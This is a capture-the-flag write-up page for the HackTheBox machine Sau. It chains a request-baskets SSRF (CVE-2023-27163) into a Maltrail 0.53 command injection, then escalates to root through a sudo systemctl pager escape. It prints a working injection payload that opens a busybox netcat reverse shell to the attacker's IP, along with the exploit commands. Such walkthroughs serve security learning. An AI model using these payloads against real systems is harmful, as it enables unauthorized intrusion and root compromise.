@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/sau.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Sau - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Sau</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Sau</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">request-baskets 1.2.1 ssrf (cve-2023-27163)</span>
+                    <span class="tag">ssrf to internal maltrail</span>
+                    <span class="tag">maltrail 0.53 command injection</span>
+                    <span class="tag">sudo systemctl status pager escape</span>
+                </div>
+
+                <img src="../../images/hackthebox/sau/index.png" alt="Sau Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. SSH is on 22, port 80 is filtered from the outside, and the only other thing reachable is an unknown service on <strong>55555</strong> that redirects to <code>/web</code>. The 400 response leaks a basket-name regex, which is the fingerprint of <strong>request-baskets</strong>.</p>
+
+                <pre><code>[sau] nmap -Pn -v -T5 --min-rate 2000 -oN nmap -sSVC -p- 10.129.229.26
+Nmap scan report for 10.129.229.26
+Host is up (0.15s latency).
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp    filtered http
+55555/tcp open     unknown
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     invalid basket name; the name does not match pattern: ^[\w\d\-_\.]{1,250}$
+|   GetRequest:
+|     HTTP/1.0 302 Found
+|_    Location: /web
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The web UI on 55555 confirms it is <strong>request-baskets 1.2.1</strong>, a service for creating throwaway HTTP endpoints ("baskets") that capture or forward requests.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>request-baskets up to 1.2.1 is vulnerable to <a href="https://www.cve.org/CVERecord?id=CVE-2023-27163">CVE-2023-27163</a>, a server-side request forgery. A basket's <code>forward_url</code> is fetched by the server, and with <code>proxy_response</code> and <code>expand_path</code> set the server relays the full response back to us, turning the basket into an open proxy into the host's internal network. That is exactly what is needed to reach the filtered port 80.</p>
+
+                <p>I used entr0pie's PoC (<a href="https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh">CVE-2023-27163.sh</a>), which creates a proxy basket pointing at an internal target. Aiming it at <code>http://127.0.0.1:80/</code> and requesting the basket reveals what is behind the filtered port 80, <strong>Maltrail 0.53</strong>:</p>
+
+                <pre><code>[sau] ./exploit.sh http://10.129.229.26:55555/ http://127.0.0.1:80/
+Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
+
+&gt; Creating the "lfvpis" proxy basket...
+&gt; Basket created!
+&gt; Accessing http://10.129.229.26:55555/lfvpis now makes the server request to http://127.0.0.1:80/.
+&gt; Authorization: Wh7AlrpwHwouEKCIjtiO6_EyLmTtNVLYW7eooRXbA7IE</code></pre>
+
+                <p>Maltrail 0.53 has an unauthenticated OS command injection in its login handler: the <code>username</code> parameter is passed into a shell command (a <code>logger</code> call) without sanitisation, so a <code>;$(...)</code> payload runs commands. Chaining it through the SSRF proxy reaches the internal login endpoint and injects a <code>busybox nc</code> reverse shell:</p>
+
+                <pre><code>[sau] curl 'http://10.129.229.26:55555/lfvpis/login' --data 'username=;$(busybox nc 10.10.15.208 35337 -e sh)'</code></pre>
+
+                <pre><code>[sau] nc -lnvp 35337
+Listening on 0.0.0.0 35337
+Connection received on 10.129.229.26 39508
+id
+uid=1001(puma) gid=1001(puma) groups=1001(puma)</code></pre>
+
+                <p>That is a foothold as <code>puma</code>, the account running Maltrail, and the user flag is in its home directory.</p>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>Checking <code>sudo</code> rights for <code>puma</code> shows one very specific allowed command:</p>
+
+                <pre><code>puma@sau:~$ sudo -l
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</code></pre>
+
+                <p><code>systemctl status</code> pipes its output through a pager (<code>less</code>) when the output does not fit the terminal, and because we run it under <code>sudo</code> that pager runs as root. Pagers let you shell out with <code>!</code>, so if we can execute <code>systemctl status</code> as root we can spawn another shell straight from the pager (<a href="https://intrusionz3r0.gitbook.io/intrusionz3r0/linux-penetration-testing/privilege-escalation/sudo-privilege-escalation#systemctl">intrusionz3r0, sudo systemctl</a>). Run the allowed command, and at the pager prompt spawn a shell:</p>
+
+                <pre><code>puma@sau:~$ sudo /usr/bin/systemctl status trail.service
+● trail.service - Maltrail. Server of malicious traffic detection system
+     Loaded: loaded (/etc/systemd/system/trail.service; enabled; ...)
+     Active: active (running) ...
+!sh
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+                <p>If the terminal is large enough that the output is not paged, shrinking the window first (or piping is disabled) forces the pager to open. From the root shell it is just reading <code>/root/root.txt</code>.</p>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Sau</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
